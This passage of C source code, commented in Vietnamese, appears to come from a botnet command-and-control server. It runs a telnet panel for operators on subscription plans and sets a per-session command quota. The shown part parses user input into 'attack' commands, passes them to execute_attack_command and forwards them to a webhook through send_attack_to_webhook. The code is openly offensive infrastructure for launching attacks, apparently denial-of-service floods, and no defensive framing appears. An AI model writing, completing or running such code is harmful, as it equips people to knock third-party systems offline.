                command_recognized = 1;
                continue;
            }

            // Kiểm tra giới hạn lệnh mỗi phiên
            if (commands_sent >= MAX_COMMANDS_PER_SESSION) {
                char limit_msg[100];
                snprintf(limit_msg, sizeof(limit_msg), 
                        "\033[31m[!] Đã đạt giới hạn %d lệnh cho phiên này. Vui lòng đăng nhập lại.\033[0m\r\n", 
                        MAX_COMMANDS_PER_SESSION);
                telnet_write(datafd, limit_msg, strlen(limit_msg));
                command_recognized = 1;
                continue;
            }

            char attack_cmd[BUF_SIZE];
            snprintf(attack_cmd, sizeof(attack_cmd), "%s %s %s %s", parts[0], parts[1], parts[2], parts[3]);
            
            // Hiển thị thông báo cho người dùng Telnet
            execute_attack_command(datafd, parts[0], parts, part_count);

            // Gửi lệnh đã định dạng tới webhook
            send_attack_to_webhook(parts, part_count);
            
            // Cập nhật biến theo dõi thời gian và số lệnh
            last_attack_time = time(NULL);
            commands_sent++;
            command_recognized = 1;
        }

        if (!command_recognized) {
            telnet_write(datafd, "Unknown command.\r\n", 18);
        }
    }

end:
    pthread_mutex_lock(&online_users_lock);
    if (managements[datafd]) {
        managements[datafd] = 0;
    }
    if (current_user) {
        free(current_user);
        current_user = NULL;
    }
    if (user_plan) {
        free(user_plan);
        user_plan = NULL;
    }
    OperatorsConnected--;
    pthread_mutex_unlock(&online_users_lock);
    close(datafd);
    return NULL;
}


int main() {
    int server_fd, client_fd, i; 
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len;
    int opt = 1;
    pthread_t thread;

    // Khởi tạo cURL
    curl_global_init(CURL_GLOBAL_ALL);

    for (i = 0; i < MAX_MANAGEMENTS; i++) { 
        userNames[i] = malloc(50);
        if (userNames[i]) userNames[i][0] = '\0';
        userDates[i] = malloc(20);
        if (userDates[i]) userDates[i][0] = '\0';
        managements[i] = 0;
    }

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt failed");
        close(server_fd);
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(TELNET_PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_fd);
        return 1;
    }

    if (listen(server_fd, 10) < 0) {
        perror("Listen failed");
        close(server_fd);
        return 1;
    }

    printf("Telnet server listening on port %d\n", TELNET_PORT);

    while (1) {
        client_len = sizeof(client_addr);
        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) continue;

        if (pthread_create(&thread, NULL, telnet_worker, (void *)(intptr_t)client_fd) != 0) {
            close(client_fd);
            continue;
        }
        pthread_detach(thread);
    }

    for (i = 0; i < MAX_MANAGEMENTS; i++) { 
        if (userNames[i]) free(userNames[i]);
        if (userDates[i]) free(userDates[i]);
    }

    // Dọn dẹp cURL
    curl_global_cleanup();
    close(server_fd);
    return 0;
}

